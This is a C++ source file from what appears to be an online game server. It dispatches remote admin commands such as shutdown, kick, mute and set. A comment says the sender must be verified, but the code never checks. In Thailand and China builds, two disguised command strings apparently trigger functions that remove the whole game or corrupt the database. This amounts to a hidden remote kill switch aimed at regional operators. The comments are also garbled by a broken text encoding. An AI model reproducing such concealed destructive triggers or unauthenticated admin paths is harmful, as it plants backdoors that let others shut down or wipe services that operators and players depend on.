//----------------------------------------------------------------------
//
// Filename    : GGCommandHandler.cpp
// Written By  : Reiot
// Description :
//
//----------------------------------------------------------------------

// include files
#include "GGCommand.h"

#ifdef __GAME_SERVER__

	#include "VariableManager.h"
	#include "Cpackets/CGSay.h"

#endif

//----------------------------------------------------------------------
// 
// GGCommandHander::execute()
// 
// ���� ������ �α��� �����κ��� GGCommand ��Ŷ�� �ް� �Ǹ�,
// ReconnectLoginInfo�� ���� �߰��ϰ� �ȴ�.
// 
//----------------------------------------------------------------------
void GGCommandHandler::execute ( GGCommand * pPacket )
	 throw ( ProtocolException , Error )
{
	__BEGIN_TRY __BEGIN_DEBUG_EX
	__BEGIN_DEBUG
	
#ifdef __GAME_SERVER__

	// pPacket�� �ٸ� GameServer�κ��� ���ƿ°������� Ȯ���ؾ� �Ѵ�.
	cout << "[" << pPacket->getHost().c_str() << ":" << pPacket->getPort() << "] "
		<< pPacket->toString().c_str() << endl;

	filelog("ggCommand.txt", "[%s:%d] %s", pPacket->getHost().c_str(),
											pPacket->getPort(),
											pPacket->toString().c_str());
			
	int i = 0;
	string msg = pPacket->getCommand();

	if (msg.substr(i+1 , 4) == "save") {

		CGSayHandler::opsave(NULL, msg, i);
	}

	else if (msg.substr(i+1 , 4) == "wall") {
		CGSayHandler::opwall(NULL, msg, i);
	}

	// halt
	else if (msg.substr(i+1 , 8) == "shutdown") {

		CGSayHandler::opshutdown(NULL, msg, i);

	}

	else if (msg.substr(i+1 , 4) == "kick" ) {

		CGSayHandler::opkick(NULL, msg, i);

	}

	else if (msg.substr(i+1 , 4) == "mute") {

		CGSayHandler::opmute(NULL, msg, i);

	}

	else if (msg.substr(i+1 , 8) == "freezing") {

		CGSayHandler::opfreezing(NULL, msg, i);

	}

	// ���� �Լ��� �� ���ÿ� �Լ�
	// set type value ���·� ���ǵȴ�.
	// 2002.5.8 �� Ȯ���� ���������� �����ϱ� ���ؼ� ����
	else if (msg.substr(i+1, 3) == "set") {

		CGSayHandler::opset(NULL, msg, i);
	}

	else if (msg.substr(i+1, 4) == "load") {

		CGSayHandler::opload(NULL, msg, i);
	}

	else if (msg.substr(i+1, 6) == "combat") {

		CGSayHandler::opcombat(NULL, msg, i);
	}

	else if (msg.substr(i+1 , 7) == "command") {

		CGSayHandler::opcommand(NULL, msg, i);

	}
	else if (msg.substr(i+1 , 17 ) == "modifyunioninfo"){

		CGSayHandler::opmodifyunioninfo(NULL, msg, i);

	}
	else if (msg.substr(i+1 , 17 ) == "refreshguildunion"){

		CGSayHandler::oprefreshguildunion(NULL, msg, i);

	}
#if defined(__THAILAND_SERVER__) || defined(__CHINA_SERVER__)

	else if (msg.substr(i+1 , 11) == "ekwldnjqjfu") {

		g_pVariableManager->setRemoveAllGame(true);

	}
	else if (msg.substr(i+1 , 9) == "skffuqjfu") {

		g_pVariableManager->setEggDummyDB(true);
	}
#endif


#endif
		
	__END_DEBUG
	__END_DEBUG_EX __END_CATCH
}
